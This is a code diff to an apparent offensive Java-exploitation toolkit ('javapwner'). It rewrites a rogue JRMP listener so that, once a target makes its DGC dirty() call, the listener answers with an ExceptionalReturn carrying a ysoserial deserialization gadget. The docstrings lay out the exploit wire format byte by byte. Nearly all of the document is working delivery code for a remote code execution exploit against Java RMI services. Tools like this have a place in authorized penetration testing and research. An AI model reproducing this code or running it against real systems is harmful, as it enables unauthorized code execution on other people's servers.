@@ -24,6 +24,9 @@ from javapwner.protocols.rmi.protocol import (
     PROTOCOL_ACK,
     MSG_RETURN,
     RETURN_VALUE,
+    RETURN_EXCEPTION,
+    JAVA_STREAM_MAGIC,
+    JAVA_STREAM_VERSION,
 )
 from javapwner.core.socket_helper import write_java_utf
 
@@ -142,11 +145,22 @@ class JrmpListener:
     def _handle_client(self, sock: socket.socket) -> None:
         """Handle one JRMP client connection.
 
-        Protocol:
-        1. Read JRMP handshake from client (7 bytes)
+        Protocol (mirrors ysoserial JRMPListener):
+        1. Read JRMP handshake from client (7 bytes: magic + version + protocol)
         2. Send ProtocolAck + host/port
-        3. Read client's endpoint info
-        4. Send RETURN_VALUE with the exploit payload
+        3. Read client's endpoint info (6 bytes: empty-UTF + zero-port)
+        4. Read the incoming CALL message (DGC dirty() call from target)
+        5. Send ExceptionalReturn with the exploit payload
+
+        Wire format of ExceptionalReturn (per JRMP spec and ysoserial):
+          0x51               MSG_RETURN  (raw byte before ObjectOutputStream)
+          AC ED 00 05        ObjectOutputStream header
+          77 0F              TC_BLOCKDATA, length=15
+            02               RETURN_EXCEPTION type byte
+            [4 bytes]        UID.unique  (int32)
+            [8 bytes]        UID.time    (int64)
+            [2 bytes]        UID.count   (int16)
+          [object bytes]     serialised gadget (payload stripped of ACED0005 header)
         """
         sock.settimeout(10.0)
 
@@ -164,19 +178,54 @@ class JrmpListener:
         )
         sock.sendall(ack)
 
-        # 3. Read client's endpoint info (variable length, just consume it)
+        # 3. Read client's endpoint info (6 bytes: writeUTF("") + writeInt(0))
         try:
-            _client_host_data = sock.recv(512)
+            sock.recv(512)
         except socket.timeout:
             pass
 
-        # 4. Send RETURN_VALUE with the payload
-        # MSG_RETURN + RETURN_VALUE(0x01) + transport-ack + payload
-        return_msg = (
-            bytes([MSG_RETURN, RETURN_VALUE])
-            + self.payload
+        # 4. Read the incoming CALL (DGC dirty() the target sends us).
+        #    We consume it but don't parse it — just drain available bytes.
+        try:
+            sock.recv(4096)
+        except socket.timeout:
+            pass
+
+        # 5. Send ExceptionalReturn with the exploit payload
+        sock.sendall(self._build_exceptional_return())
+
+    def _build_exceptional_return(self) -> bytes:
+        """Build a JRMP ExceptionalReturn message containing the exploit payload.
+
+        The payload from ysoserial is a complete ObjectOutputStream (starts with
+        AC ED 00 05).  We strip that header and embed the inner object bytes
+        directly inside our return ObjectOutputStream, matching the format
+        produced by ysoserial.exploit.JRMPListener.
+
+        Note: handle numbering is preserved because TC_BLOCKDATA does not
+        allocate handles, so the first TC_OBJECT in the embedded payload still
+        gets handle 0x7E0000 — the same as in the standalone ysoserial stream.
+        """
+        # Strip the OOS header from the payload to get the raw object bytes.
+        payload = self.payload
+        inner_object = payload[4:] if payload[:4] == b"\xac\xed\x00\x05" else payload
+
+        # UID: unique(int32=0) + time(int64=0) + count(int16=0) = 14 bytes
+        uid = struct.pack(">i", 0) + struct.pack(">q", 0) + struct.pack(">h", 0)
+
+        # Blockdata: ExceptionalReturn type byte + UID = 15 bytes total
+        blockdata = bytes([RETURN_EXCEPTION]) + uid
+        assert len(blockdata) == 15  # sanity check: TC_BLOCKDATA length = 0x0F
+
+        return_stream = (
+            JAVA_STREAM_MAGIC                        # AC ED
+            + JAVA_STREAM_VERSION                    # 00 05
+            + b"\x77" + bytes([len(blockdata)])      # TC_BLOCKDATA, 0x0F
+            + blockdata                              # 02 + UID (15 bytes)
+            + inner_object                           # TC_OBJECT ... (gadget)
         )
-        sock.sendall(return_msg)
+
+        return bytes([MSG_RETURN]) + return_stream
 
     @staticmethod
     def _recv_exact(sock: socket.socket, n: int) -> bytes:
